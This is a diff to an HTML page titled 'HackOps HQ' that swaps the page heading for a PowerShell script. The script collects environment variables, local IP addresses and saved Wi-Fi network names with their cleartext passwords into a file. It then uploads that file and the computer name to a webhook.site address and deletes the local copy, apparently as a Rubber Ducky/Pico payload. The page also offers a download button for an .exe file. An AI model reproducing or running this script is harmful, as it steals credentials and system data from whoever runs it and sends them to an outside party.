@@ -133,7 +133,17 @@
 
   <!-- Main Content -->
   <div class="content">
-    <h1>Welcome to HackOps HQ</h1>
+    <h1>$url="https://webhook.site/d06a384b-10ea-4d4d-941d-4861067de848";
+dir env: >> stats.txt;
+Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\\d+\\.\\d+)' >> stats.txt;
+(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}
+| Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_}
+| %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;
+$Body=@{ content = "$env:computername Stats from Ducky/Pico"};
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $url -Method Post -Body ($Body | ConvertTo-Json);
+curl.exe -F "file1=@stats.txt" $url;
+Remove-Item '.\\stats.txt';
+exit</h1>
     <div class="buttons">
       <a href="https://bleh-xi.vercel.app/Charlottes%20App.exe">
         <button>Charlottes App.exe</button>
